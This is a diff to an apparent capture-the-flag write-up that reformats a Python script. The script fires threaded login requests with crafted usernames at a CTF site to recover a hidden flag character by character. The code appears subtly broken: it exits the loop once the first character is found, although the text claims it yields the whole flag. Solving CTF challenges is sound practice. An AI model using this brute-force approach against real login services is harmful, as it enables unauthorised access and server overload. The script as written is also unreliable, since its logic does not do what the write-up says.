@@ -182,10 +182,45 @@ fetch('/register', {
 
 
 - since we know the password we can now blindly brute force the flag by trying to brute force logging in and after every successful login attempt we can construct the flag. At first I thought this would crash the server but its very trivial since the attempts needed isnt much (about =<3000 attempts ). We can do this easily with a python script :  
-```python
-#url = "inserturl" 
-import string import _thread flag = ['']*50 def req(i,c): global flag import requests resp = requests.post(url+"/login", json={"username": ("c"*i)+str(ord(c)), "password":"pass"}) if resp.status_code == 200: flag[i] = c import time count = 0 for i in range(80): for c in string.printable: _thread.start_new_thread(req, (i,c)) count += 1 if count %20 == 0: time.sleep(1) print(''.join(flag)) if flag[i] != '': break if "}" in flag: break print(flag) print(''.join(flag))
+```
+import string
+import threading
+import requests
+import time
 
+url = "https://your.ctf.site"  # Fill in the real URL
+flag = [''] * 50
+flag_lock = threading.Lock()
+
+def req(i, c):
+    global flag
+    resp = requests.post(
+        url + "/login",
+        json={"username": ("c" * i) + str(ord(c)), "password": "pass"}
+    )
+    if resp.status_code == 200:
+        with flag_lock:
+            flag[i] = c
+
+threads = []
+for i in range(80):  # Adjust 80 as needed for flag length
+    for c in string.printable:
+        t = threading.Thread(target=req, args=(i, c))
+        t.start()
+        threads.append(t)
+        if len(threads) % 20 == 0:
+            time.sleep(1)
+    # Wait for all threads for this position to finish
+    for t in threads:
+        t.join()
+    threads = []
+    print(''.join(flag))
+    if flag[i] != '':
+        break
+    if "}" in flag:
+        break
+
+print(''.join(flag))
 ```
 
 - after running the python script in the terminal we should see the flag form :) 
